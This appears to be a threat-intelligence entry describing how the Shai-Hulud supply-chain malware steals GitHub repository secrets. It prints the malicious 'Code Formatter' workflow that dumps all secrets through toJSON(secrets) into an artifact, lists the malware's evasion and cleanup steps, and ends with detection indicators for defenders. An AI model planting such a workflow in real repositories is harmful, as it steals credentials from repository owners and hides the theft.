  description: |
    The Shai-Hulud campaign includes a sophisticated technique for exfiltrating
    GitHub-defined secrets by creating a temporary workflow that exposes all
    repository secrets through workflow artifacts, then cleaning up evidence
    of the attack.

    ## Attack Mechanism

    The malware performs a multi-step secrets exfiltration process:

    1. **Branch Creation**: A new branch named `add-linter-workflow-{timestamp}`
       is created in the victim's repository.

    2. **Workflow Injection**: A malicious workflow file named
       `.github/workflows/formatter_123456789.yml` is pushed to the new branch.

    3. **Secrets Exposure**: The workflow lists and collects all secrets defined
       in the GitHub secrets section using `toJSON(secrets)`.

    4. **Artifact Upload**: The secrets are uploaded as a workflow artifact.

    5. **Artifact Download**: The malware downloads the artifact to the
       compromised machine as part of the exfiltration process.

    6. **Cleanup**: The workflow and branch are deleted to hide the
       exfiltration activities.

    ## Malicious Workflow Content

    ```yaml
    name: Code Formatter
    on:
      push
    jobs:
      lint:
        runs-on: ubuntu-latest
        env:
          DATA: ${{ toJSON(secrets)}}
        steps:
          - uses: actions/checkout@v5
          - name: Run Formatter
            run: |
              cat < format.json
              $DATA
              EOF
          - uses: actions/upload-artifact@v5
            with:
              path: format.json
              name: formatting
    ```

    ## Exfiltration Output

    The stolen secrets are written to the `actionsSecrets.json` file in the
    exfiltration repositories, making them available to the attackers while
    being cross-referenced with other victim data.

    ## Evasion Techniques

    - Uses innocuous workflow names like "Code Formatter" to appear legitimate
    - Creates temporary branches to avoid polluting main branch history
    - Deletes all evidence (workflow file and branch) after successful exfiltration
    - Brief execution window minimizes detection opportunity

    ## Detection Indicators

    - Unexpected branch creation with naming pattern `add-linter-workflow-*`
    - Workflow files that reference `toJSON(secrets)`
    - Short-lived branches containing workflow files
    - Workflow runs that upload artifacts containing JSON data
